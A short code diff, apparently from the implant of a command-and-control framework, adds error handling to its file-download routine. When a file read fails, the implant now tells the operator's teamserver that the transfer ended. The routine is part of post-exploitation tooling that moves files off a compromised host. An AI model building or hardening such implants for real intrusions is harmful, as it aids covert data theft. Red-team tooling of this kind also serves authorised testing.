@@ -149,7 +149,26 @@ VOID DownloadPush()
             MemSet( Instance->DownloadChunk.Buffer, 0, Instance->DownloadChunk.Length );
 
             if ( ! Instance->Win32.ReadFile( Download->hFile, Instance->DownloadChunk.Buffer, Instance->DownloadChunk.Length, &Read, NULL ) )
+            {
                 PRINTF( "ReadFile Failed: Error[%d]\n", NtGetLastError() );
+
+                /* notify the teamserver that the transfer died so the
+                 * download isn't left open/incomplete on the operator side */
+                Package = PackageCreateWithRequestID( DEMON_COMMAND_FS, Download->RequestID );
+
+                /* Add Download header. */
+                PackageAddInt32( Package, 2 ); /* Download sub command */
+                PackageAddInt32( Package, DOWNLOAD_MODE_CLOSE );
+                PackageAddInt32( Package, Download->FileID    );
+
+                /* Download Close data */
+                PackageAddInt32( Package, DOWNLOAD_REASON_REMOVED );
+
+                PackageTransmit( Package );
+
+                Download->Size = 0;
+                Read           = 0;
+            }
 
             Download->Size     -= Read;
             Download->ReadSize += Read;
